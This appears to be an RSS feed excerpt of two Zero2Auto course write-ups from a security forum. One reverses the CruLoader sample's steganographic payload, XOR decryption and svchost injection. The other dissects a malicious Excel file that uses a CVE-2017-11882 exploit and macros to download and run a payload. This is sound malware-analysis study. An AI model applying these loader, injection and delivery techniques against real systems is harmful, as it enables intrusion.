<p>This function first resolves a few Internet WINAPIs:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/44d64d01cda38f0da1a5286cb44ab8a6317be6bb.png" alt="" data-base62-sha1="9OXBwZeFbSCfbJKW1Ryhh27GM5B" width="624" height="203"></p>
<p>Then a strange string located at offset <strong>0x0413C7C</strong> is passed into a code block and decrypted by a very simple algorithm:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7d06b77944eb466372c1b340bf37176129d82db6.png" alt="" data-base62-sha1="hQ24BrwLgSZML4XkBdgpEPS7ftI" width="242" height="203"></p>
<p>So, our encrypted byte sequence:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/07a3b606bf78465dfb9334773ac0c999f431a9ce.png" alt="" data-base62-sha1="15A5G20rwZHsvTqHNSbqtFdb7cO" width="608" height="18"></p>
<p>Returns:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/5/55c25aa5b35e4173635d1bffe774051c9560ea17.png" alt="" data-base62-sha1="ceEZaU1g8mbVcMBpfpdgbT8Q8xV" width="439" height="34"></p>
<p>Which resolves to <strong>[Redacted]</strong><br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2b6a5c18203384236d79ec780242fef9f8437a69.png" alt="" data-base62-sha1="6c4pao0NHaQEZBybSU5zH7ZBKjf" width="499" height="191"></p>
<p>Hmm… This might indicate stenography is involved. Let’s continue with the analysis</p>
<p>This pastebin link is passed into <strong>sub_401290</strong> this function returns the image link contained within the pastebin and saves it within the memory.</p>
<p>This resolved link is passed into <strong>sub_4013A0</strong>, first the function reads the contents of the image file linked passed into it. Using <strong>sub_401290</strong> which I renamed to <strong>func_ReadWebContents</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/42778a1e92da889e27b8655b91c62db039f4bf49.png" alt="" data-base62-sha1="9tZCLGJufbkNgcqt6X9pUTEG6P7" width="340" height="335"></p>
<p>Then the function decodes a string located with <strong>qword_413CA4</strong><br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/1/124a57751021f00a4b1b6be49d668e5be9499abe.png" alt="" data-base62-sha1="2BNRYSpBSVXwatHMIY4DC21sxpY" width="339" height="16"></p>
<p>Which resolves to <strong>output.jpg</strong>, then it computes a path to the Temp directory and converts the it to a WCHAR type string, then specially picked bytes are extracted from the data section to compute this path:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/28475db7c4c10f22a7b1ad87ea677a5b71c63ee4.png" alt="" data-base62-sha1="5KjZZOemWYigmxNmaDZik45zIuU" width="422" height="21"></p>
<p>Then <strong>CreateDirectory</strong> is invoked to create the <strong>cruloader</strong> folder, after which the <strong>output.jpg</strong> file string is append to this path to create the following string:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0a153237646743396fb9996e6254a70ee212edce.png" alt="" data-base62-sha1="1rcbBQ0qub21DxEiGrmHUJbvNH8" width="502" height="24"></p>
<p><strong>CreateFileW</strong> is then invoked to create this file:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/aeef65d105d85f1c451d0d29cf4391241c449060.png" alt="" data-base62-sha1="oXxZcrLdsTyuZ75nuzHD2K1VYoo" width="367" height="188"></p>
<p>Then the PNG file extracted from the previous website is copied into this file using <strong>WriteFile</strong><br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/4/4f974c44154e67a449b4af9675d43f4d16647d21.png" data-download-href="/uploads/short-url/bm5Sdo961shw9oaJ5aV4OEqAJqx.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4f974c44154e67a449b4af9675d43f4d16647d21.png" alt="" data-base62-sha1="bm5Sdo961shw9oaJ5aV4OEqAJqx" width="624" height="325" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4f974c44154e67a449b4af9675d43f4d16647d21_2_10x10.png"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/7/7e3e07072d78ed53d49fb66a45ca8c65d6987658.png" data-download-href="/uploads/short-url/i0N3nqF30BoEU1l0DcHOGTYemBq.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7e3e07072d78ed53d49fb66a45ca8c65d6987658_2_357x220.png" alt="" data-base62-sha1="i0N3nqF30BoEU1l0DcHOGTYemBq" width="357" height="220" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7e3e07072d78ed53d49fb66a45ca8c65d6987658_2_357x220.png, https://0x00sec.s3.amazonaws.com/optimized/2X/7/7e3e07072d78ed53d49fb66a45ca8c65d6987658_2_535x330.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/7/7e3e07072d78ed53d49fb66a45ca8c65d6987658_2_714x440.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7e3e07072d78ed53d49fb66a45ca8c65d6987658_2_10x10.png"></a></div><br>
Afterwards the sample attempts to locate a string <strong>“redaolurc”</strong> (which is <strong>cruloader</strong> reversed) within the image data download<p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/c/c98c2544bd281b4a22015219e5b5d3fd8496ad0e.png" data-download-href="/uploads/short-url/sKYeo7n8mJY3NyfFtUHl4c8yIsC.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c98c2544bd281b4a22015219e5b5d3fd8496ad0e_2_624x193.png" alt="" data-base62-sha1="sKYeo7n8mJY3NyfFtUHl4c8yIsC" width="624" height="193" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c98c2544bd281b4a22015219e5b5d3fd8496ad0e_2_624x193.png, https://0x00sec.s3.amazonaws.com/original/2X/c/c98c2544bd281b4a22015219e5b5d3fd8496ad0e.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/c/c98c2544bd281b4a22015219e5b5d3fd8496ad0e.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c98c2544bd281b4a22015219e5b5d3fd8496ad0e_2_10x10.png"></a></div><p></p>
<p>After locating the string within the image data, this offset is used to access encrypted data. The data is xored with <strong>xmmword</strong>(which is 128-bit) 40 times. The xor key is <strong>0x61</strong>(‘a’). One could also notice that there are a lot of ‘a’ characters within the encoded payload. These ‘a’ characters are actually zeroes within the binary, because 0 ^ 0x61 = 0x61 so this payload isn’t obfuscated with high class obfuscation as on could infer this pretty quickly.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d33941f3cefe393d2fa4de90ce90c6e3dee11293.png" alt="" data-base62-sha1="u8zq36M3Ju3Ac7SvxnFzYungx5F" width="540" height="14"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b7ad3069fb08a03094966453f4bfffd2cbb9f8c0.png" alt="" data-base62-sha1="qcSqQHmjxTWzzc70Z2s9EarTDEY" width="400" height="449"></p>
<p>And the result is a valid PE file:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1b2451ba414f635fb70c20639f45b8c16c01e59e.png" alt="" data-base62-sha1="3S6HJiwLyvFitui9PNHM3eNSNXM" width="598" height="170"></p>
<p>After dumping this PE I’ve observed it within IDA and it would appear as if this is the final payload!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/1/13610ade6b92d083d79d8766f48c67e64e9ce873.png" data-download-href="/uploads/short-url/2LqZ2cbMSh71Id7IZXYUc4WNrTt.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/13610ade6b92d083d79d8766f48c67e64e9ce873.png" alt="" data-base62-sha1="2LqZ2cbMSh71Id7IZXYUc4WNrTt" width="624" height="162" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/13610ade6b92d083d79d8766f48c67e64e9ce873_2_10x10.png"></a></div><p></p>
<p>This PE Is then mapped, relocated and then fixed with <strong>VirtualProtect</strong> and finally injected into <strong>svchost.exe</strong> again within the function sub_401750 this executing the final payload.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/72e4a4d8e1099066780f7a6aae9e4184b622cdb6.png" alt="" data-base62-sha1="gooixmmm1g7w25z47RNUpWU7uku" width="474" height="201"></p>
<p>And that’s pretty much it!</p>
<hr>
<h2>Automation</h2>
<p>Alright, Let’s begin attempting to automate the process of extracting all payloads and dumping them on disk.</p>
<p>We begin with the resource section; this one is pretty easy.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/5/5f035540468d2a90a48eab2d620dab67ada359a0.png" data-download-href="/uploads/short-url/dywv2s2V9gU8jpoK8hfy2QPv41q.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5f035540468d2a90a48eab2d620dab67ada359a0.png" alt="" data-base62-sha1="dywv2s2V9gU8jpoK8hfy2QPv41q" width="624" height="37" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5f035540468d2a90a48eab2d620dab67ada359a0_2_10x10.png"></a></div><p></p>
<p>First we begin looking for a string at offset 0x60 + 0xc from the begging of the resource section, and load the string which is 16 bytes in length.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/29171d42d54c8d1ad8ed4bb9048f07c7a592a2a2.png" alt="" data-base62-sha1="5Rv66rokx0ge8HGZhb64icEL5PI" width="483" height="104"></p>
<p>Then, we load the rest of the payload into another variable</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/d/d9fd7e4247d4a5329651c9ea51ac38b717ded42a.png" data-download-href="/uploads/short-url/v6qIv4B10bxZDEeLQcrq0HAgryy.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d9fd7e4247d4a5329651c9ea51ac38b717ded42a.png" alt="" data-base62-sha1="v6qIv4B10bxZDEeLQcrq0HAgryy" width="624" height="272" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d9fd7e4247d4a5329651c9ea51ac38b717ded42a_2_10x10.png"></a></div><p></p>
<p>Then we use the ARC4 python module to decrypt this data and dump it on disk</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2b3f3084f08e1556a29cdea2ccb88a9d7287100a.png" alt="" data-base62-sha1="6azUG4fcBS6TVh44jrgAFoOzdr4" width="457" height="197"></p>
<p>Now as we posses the second payload, we must locate the pastebin URL inside the PE file.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/1/1378a7914b3ec171a43c00abd7feec56fa1f347d.png" data-download-href="/uploads/short-url/2Mfzx9Y3I0Guqfqsg8kqPPi3WG1.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1378a7914b3ec171a43c00abd7feec56fa1f347d.png" alt="" data-base62-sha1="2Mfzx9Y3I0Guqfqsg8kqPPi3WG1" width="624" height="147" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1378a7914b3ec171a43c00abd7feec56fa1f347d_2_10x10.png"></a></div><p></p>
<p>We know our URL is located two <strong>XMM_WORDS</strong> (32 bytes) in size after the offset of the string <strong>“cruloader”</strong> so let’s set this up:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/125c137c4c9818d5a831f3365428e29395dfc35f.png" alt="" data-base62-sha1="2CpRJlvLCEwmLqVgLoFAbGThxTx" width="276" height="66"></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/3/3cbe2aae17347503af50cbd9083e2b4d0b54586d.png" data-download-href="/uploads/short-url/8Fm4RV2bNftl5dPHsLIsgSKuUqh.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3cbe2aae17347503af50cbd9083e2b4d0b54586d.png" alt="" data-base62-sha1="8Fm4RV2bNftl5dPHsLIsgSKuUqh" width="624" height="247" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3cbe2aae17347503af50cbd9083e2b4d0b54586d_2_10x10.png"></a></div><p></p>
<p>We calculate the offset by locating the <strong>“cruloader”</strong> string, adding 3 bytes to skip the null bytes and then jumping after both irrelevant <strong>XMM_WORDS</strong>. We extract our data and we set the <strong>XOR</strong> key to 0xC5</p>
<p>Then for each byte extracted we perform a four <strong>ROL</strong> and then a xor to match the decryption algorithm</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e3747a462e8b93a1f1e5f63ed5a437390c3b6c57.png" alt="" data-base62-sha1="ws9W9yE07LclKn659Dq4ZtkhqPZ" width="301" height="231"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7187043c0d0abba2c3056c644e744a06416988fd.png" alt="" data-base62-sha1="gcjdZQrUSWdCUCQ28hAc1DhVEId" width="526" height="89"></p>
<p>We then use <strong>URLLIB</strong> to extract the pastebin URL and then we use that same lib to extract the contents of the payload image</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c14ba4926aa668dd625d670a6d319a91514c6ce6.png" alt="" data-base62-sha1="rzYdnP2H6erq9a0RD3KtSfJmKAS" width="549" height="143"></p>
<p>Finally, to locate the payload within the <strong>PNG</strong> payload file we locate the reverse <strong>“cruloader”</strong> string, extract the payload and then xor it with <strong>0x61</strong>.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/d/dc2e61293f10b43bafb58b23982dba5912771b6f.png" data-download-href="/uploads/short-url/vpOpuDq0Bj9jH14DotlaqT5hH5B.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/dc2e61293f10b43bafb58b23982dba5912771b6f.png" alt="" data-base62-sha1="vpOpuDq0Bj9jH14DotlaqT5hH5B" width="624" height="153" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dc2e61293f10b43bafb58b23982dba5912771b6f_2_10x10.png"></a></div><p></p>
<p>And that’s it! Easy as that!</p>
<p>I really enjoyed this challenge and I’m looking forward to continuing the course <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"><br>
Hope you enjoyed reading this!</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/zero2auto-cruloader/22420">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/zero2auto-cruloader/22420</link>
          <pubDate>Sun, 26 Jul 2020 12:37:38 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-22420</guid>
          <source url="https://d.clarkee.co.uk/t/zero2auto-cruloader/22420.rss">Zero2Auto - CruLoader</source>
        </item>
        <item>
          <title>[Zero2Auto] – Initial Stagers - From one Email to a Trojan</title>
          <dc:creator><![CDATA[Danus]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1>Zero2Auto – Initial Stagers - From one Email to a Trojan</h1>
<h2>Preface</h2>
<p>This week we have discussed deobfuscating initial stagers and how to unpack their executable payloads.<br>
And what I’ve decided to do, to practice this week lesson is to find actual malware on any.run and unpack its entire initial stage.</p>
<p><strong>Setting up goals:</strong></p>
<ol>
<li>I’ll choose an infected document from any.run, then I’ll deobfuscate it and extract its payload</li>
<li>I’ll take the payload and unpack it from memory, showcasing how to unmap a dumped PE</li>
<li>I’ll attempt to practice the first lesson by finding identifying encryption schemes or known algorithms within the payload.</li>
</ol>
<p><strong>Required background:</strong></p>
<ol>
<li>Knowledge in reversing VBA code</li>
<li>Knowledge in reversing PowerShell code</li>
<li>Knowledge in various analysis utilities (Process Hacker, PEBear, PEStudio, PEId)</li>
<li>Knowledge in IDA Pro</li>
<li>Knowledge in x64dbg</li>
<li>Basic understanding of stack overflow exploits and how to debug shellcode</li>
</ol>
<hr>
<h2><span>Choosing a Target:</span></h2>
<p>I decide to go on any.run to find an interesting sample – I have experience in macro deobfuscation so I decide to look for a infected document hosting an exploit which delivers a payload.</p>
<p>I decide to filter MS Office files with an exploit tag, and quickly find a huge batch of files:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fb4e50bd5d0cc4c701f56b0adedba214790a6e41.png" alt="" data-base62-sha1="zR9Dn3Cg5BEOHVSpuOB9TOdKqHf" width="624" height="295"></p>
<p>Its valuable to mention that <strong>CVE-2017-11882</strong>(<a href="https://unit42.paloaltonetworks.com/unit42-analysis-of-cve-2017-11882-exploit-in-the-wild/" rel="noopener nofollow ugc">you can read about it here</a>) is the same exploit used in the Zero2Auto lesson and it seems as it’s the most used exploit when delivering malicious docs. I’ve also observed that the exploit is sometimes leveraged that attacks the Outlook app directly when I filtered for email message file types:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1b4b68d1f708f80e85bd179b8ce578a7b1cb3231.png" alt="" data-base62-sha1="3TssfKSwLYsN4MN6J0ktHOfsJPj" width="624" height="294"></p>
<p>I have chosen the following sample:</p>
<p><a href="https://app.any.run/tasks/fce8f628-52cf-4f5d-968c-ab59ddeaabda/" rel="noopener nofollow ugc">https://app.any.run/tasks/fce8f628-52cf-4f5d-968c-ab59ddeaabda/</a> and the reason for that mainly is because the infection chain is long, contains a wsf script, a vbs script and finally an EXE payload thus it could give me a lot of room to practice my knowledge.</p>
<hr>
<h2><span>From an email lure to an exploit:</span></h2>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2af671581864080fc73ea5e6e68e688205072593.png" alt="" data-base62-sha1="6843p6aLdpZWOZEhE2DpFWKY8ZJ" width="624" height="336"></p>
<p>I decide to extract the excel document and inspect it(SHA-256 97CC9023C114013326A97E946B0CA71BB641952208B5BA04463F1DAF15E1A5B5).</p>
<p><strong><span>Method 1 – Examining the document by opening it</span></strong></p>
<p>The first method is rather, not very safe to say the least but you should be fine if you have macros disabled by default, so I open up the Excel document and I’m met with the following:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/05acfdf64a38e7877f2bcad6b4eb551e704462eb.png" alt="" data-base62-sha1="Od1j3FeuaEwMjbwsJww1Th2V2H" width="624" height="286"></p>
<p>I’m definitely not going to enable macros but before I review the macros I decided to check out the rest of the sheets. Sheet number 2 has a very interesting object within it:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/05dceef19af70508319bc020dfd22c6e77c3b974.png" alt="" data-base62-sha1="PRJz2MgXwkMdDmiti9k20ScEGE" width="195" height="101"></p>
<p>And if you double click it:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/944bd2f8763d7fdfbebb536d2fb24241e6576e52.png" alt="" data-base62-sha1="l9T7jFloi34h8VakFTJOWRTn6Yq" width="624" height="201"></p>
<p>This is an equation editor object that was embedded within the document, as I’m running on a fairly new MS Office version and this exploit was long ago mitigated on new versions I would expect I’d run into problems in performing this exploit but I bet I can do some stuff with the shellcode itself if we find it. Let’s continue to Sheet3:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9264d7200b0dd23514a0f544162a3ffbe7b075e7.png" alt="" data-base62-sha1="kT3L7PzFTltvQlsUa8OmLydIKCb" width="143" height="193"></p>
<p>An observant person like myself (flex much danus?) noticed this two little square and if we double click them, we’ll see that they are actually objects embedded within this document</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d785b20eaf6ab9e40cb0faf9d9eae183a4c57bb7.png" alt="" data-base62-sha1="uKB62PZ8a2iCQE5G79e0Qg4BAW3" width="518" height="462"></p>
<p>These can also be seen being launched in the any.run view:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b2b19a36ed270f5141cfeecb9273dfee8b960db6.png" alt="" data-base62-sha1="puNv4kUI5ljZ2YWVfWYOy5pbaXI" width="624" height="331"></p>
<p>What was interesting that if we decide to the view the locations of these embedded objects</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3a34f012da7e305a94d2417e102c6f0038d12b7e.png" alt="" data-base62-sha1="8iV6WqjIIMjBCK8iYUt5Qso3HuC" width="466" height="184"></p>
<p>They are located within the Temp folder, but I never downloaded them.</p>
<p>To be honest, at this point we can stop the analyzes and simply dump these objects but I would like to review the actual shellcode of the exploit itself just to analyze it. So, I decided to enter the macro editor, and would you like at what I’ve found:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a947876c3beb639b283595e0fb7f5e8ba1fe58ed.png" alt="" data-base62-sha1="o9vWrD0sfaZrWVhwlo57oyZx7bv" width="377" height="101"></p>
<p><strong>Auto_Open</strong> is great news for us!</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8ae822906db56871d854325e92b0f50baaeccda2.png" alt="" data-base62-sha1="jOPeKuo7LVDKPtJvWr5PmoztY1I" width="624" height="219"></p>
<p>I’ve decided to remove the macro deobfuscation from the scope of this blog because it’s pretty straight forward, so I’ll summarize it. This first stage macro contains another macro within itself, it copies this macro inside C:/Programdata/asc.txt and then it runs the newly written macro. There is one problem with this method though, this xlsm file is trashed and I can’t modify it. It means that every time I want to edit the xlsm, I have to run the malicious macro.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8d7d6b10ca879fe28563b9264a8c7e95bfb0a2fc.png" alt="" data-base62-sha1="kbG1TMCcLkKOsf0Uyqnw5zX15mc" width="624" height="227"></p>
<p>The second script is odd to say the least, it includes a lot of documentation for some reason and a lot of nonsense comments and text. I found one valuable text though:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/ba6f63920648616dfbd1f6d2d6e0df83edcb8841.png" alt="" data-base62-sha1="qBhstfn91sWj7MMLxF2NvVZSUJX" width="624" height="62"></p>
<p>Jokes aside this new macro is extremely obfuscated to the point where I could not use Daniels method of manual deobfuscation, so I decided to look for any valuable info.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/15af133cee9c6ea8f305fb44006b80b2e2e971aa.png" alt="" data-base62-sha1="35P7Fkuezq9Fv7zN4GNLPGHPjlM" width="624" height="212"></p>
<p>One of the functions had Http function references and direct calls to some variable called myURL. The final function which I renamed to <strong>DownloadFile</strong> contains these references to the myURL Variable. Alas tho, this concluded with more confusing VBS code that I could not debug, for two reasons – being that this xlsm file is completely broken and I cant save it which doesn’t allow me to edit and debug the code properly and this method is also extremely dangerous as I couldn’t edit the malicious macro I kept executing the malware each time I opened the excel file. I had two more tools in my arsenal, one was to extract the two VBS files I’ve located within the excel and this can be done by manually opening the excel or using OLETools and honestly it’s a lot more safer to use OLETools so I set off to do just that.</p>
<p><strong><span>Method 2 – Using OLETools to examine the excel</span></strong></p>
<p>We know that there are embedded objects with the excel because we saw them and we know they are automatically saved inside the Temp folder as we opened the excel even if Macros are disabled and indeed it was true I found the files in the temp folder but if we want to extract the files safely we should use OLETools for that. I decided to use OLEVba first on the macro itself to see if it can extract anything meaningful from the macro, we located</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8217427a7c4f485fd2fd6f6f4bd41f9628c10415.png" alt="" data-base62-sha1="iyPU62fuQybTrnxj5pZghtflE2h" width="624" height="271"></p>
<p>Thankfully OLEVba did a lot of the work for us! By detecting the location of the exe payload. I also noticed that there are 4 OLE objects embedded within the xlsm. As we recall we found the Equation Editor, xx, mm so let’s try extracting them.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b95891993a26d291409231eee90ae4f24d822161.png" alt="" data-base62-sha1="qrE5yMg6NIintwmfrc14nI0835v" width="624" height="75"></p>
<p>Let’s use OLEDump to view the files embedded with in the script:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/8/8496350482858e65f57d462eaec49db1b4abdbad.png" data-download-href="/uploads/short-url/iUUQhKqv4v9EOngFmS068nimKGV.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8496350482858e65f57d462eaec49db1b4abdbad.png" alt="" data-base62-sha1="iUUQhKqv4v9EOngFmS068nimKGV" width="624" height="377" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8496350482858e65f57d462eaec49db1b4abdbad_2_10x10.png"></a></div><p></p>
<p>So the M signifies macro, we know that Module2 contains the Auto_Run macro, and from what I can tell there are 3 interesting files:</p>
<p><strong>B, C, D</strong> I think the sub numerators to each character represent data within these objects. We know that xx, mm and the equation editor are embedded within this excel and because D3 I’d be assuming that object D is the vulnerable equation editor file. I suspect that since Microsoft mitigated the EQ3 exploit the attacker embedded it inside the excel and one of the macros somehow executes it. Well let’s see:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/58b9c5e7bf4c7a2d56970ddb648554eb8a81cb9a.png" alt="" data-base62-sha1="cEU2859yGofeB6ptJ3jHmkiWa6K" width="624" height="456"></p>
<p>Alright, so this <strong>mm</strong> it looks like java script, interesting.</p>
<p>I decided to view the <strong>C2</strong> stream which looks like the second stage vbs I found by viewing the excel manually it just looks… less obfuscated?</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8fff3abbd32c55aeaacb9fcc1b8cf09913ee4817.png" alt="" data-base62-sha1="kxR6uRrlgvpFMn03t7wFpbr43JR" width="624" height="385"></p>
<p>The one I viewed looked very similar, after further inspection I realized this is the same script I saw before with less obfuscation.</p>
<p>Alright, now lets view the final stream which is <strong>D3</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d0a23a3ff9ac022751419040434a376b4c95d3a9.png" alt="" data-base62-sha1="tLESQZbF8OGTlWRva0KaFUImgcN" width="624" height="54"></p>
<p>As it looks like, this is the stack overflow implementation of the equation editor. The reason I assume this is because the long stream of bytes after the cmd shell string, also it looks very similar to the example POC given in the article I linked above regarding the CVE. I’ll dump this one as well.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/70af2b5260d8a362ee8da3796760777be5a50055.png" alt="" data-base62-sha1="g4QM3cixSCYvg3lEa4AqA8wLEK9" width="430" height="28"></p>
<p>All this does is rename the mm script to be named v, and then it executes.</p>
<p>So, lets summarize our findings:</p>
<ol>
<li>By examining the excel we know that a macro exists within it that loads another macro, we’ll call them first_stage and second_stage respectively</li>
<li>We also know that there inside the excel file, there are 3 objects embedded within them:
<ol>
<li><strong>xx</strong></li>
<li><strong>mm</strong></li>
<li><strong>E3shellcode</strong></li>
</ol>
</li>
</ol>
<p>By examining the E3shellcode we can safely assume its meant to exploit the equation editor, which does not exist in my excel version but we can assume that it is true because if we look inside the any.run flow<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/a/ae99cde6e3e2d462c9733267de01246cc283e64e.png" alt="" data-base62-sha1="oUABs0woY7iBDhdfCWWfehnzlnM" width="624" height="127"></p>
<p>We can see that EQNEDT32.EXE is calling that exact same shellcode, which is supposed to execute <strong>mm</strong>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e39fe6c372a76f7dbf121e17b919a9eb2994ac68.png" alt="" data-base62-sha1="wtEYke3UAaxH3YWhqjvmAvyMfLa" width="624" height="263"></p>
<p>All mm does is execute <strong>xx</strong> and since we have vba script **xx **in its kinda deobfsucated form, so this time I’m really forced to analyze it. But one question arises? Why is there an exploit embedded within this excel AND a malicious macro that directly invokes <strong>xx.vbs</strong>? The answer for this is simple, since Microsoft mitigated the exploit in newer office versions the exploit will not work and why count on that? The threat actor dealt with that problem by additionally including a macro that would run the malware anyway.</p>
<p><strong><span>Dealing with long, obfuscated, annoying and blinding VBA:</span></strong></p>
<p>We already kinda know that this VBA script is responsible for downloading a file off the internet and executing it but for the sake of practice, I wanted to try and debug this code myself. I started up by cleaning up trash code, giving variables meaningful names and finally cleaning up string fragmentation.</p>
<p>The first two function called ase64Decode tse ase64Decode decodes base 64 code:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/200accce4db322e9d44dc8bebe1f48155848be90.png" alt="" data-base62-sha1="4zspUMlgruu7gtGeJUyOs3nlDTW" width="444" height="500"></p>
<p>It’s easy to tell because of the name and because it accepts strings as parameters and additionally we see a call to both of these functions passing two strings with comments next to them:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d4eab593f568cbee9032e9b5afaf2e65f7844443.png" alt="" data-base62-sha1="uny5kQiMQRWh6zwnuFGJevL7wsz" width="469" height="36"></p>
<p>“filestring” and “linkstring”, huh I wonder…</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/70aa7ad881d69c7aace2c08c0564ab0b27542285.png" alt="" data-base62-sha1="g4GJ8T8zFlYJLEqY4pY3xEIE7hb" width="431" height="500"></p>
<p>We found the payload location which will be downloaded, then the file would be saved in some location under name putty.exe, then a function called <strong>KTx34hygf37it35hyr</strong> which I renamed to <strong>DownloadFile</strong> downloads the payload to disk, how do I assume this? It’s literally documented within the macro.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/26c361d89d367be24e804536c6ae8b2079441769.png" alt="" data-base62-sha1="5wUKoB6nQflm6f1tdmk6cKY5opz" width="624" height="120"></p>
<p>Then the file is saved into C:\ProgramData\ and executed:</p>
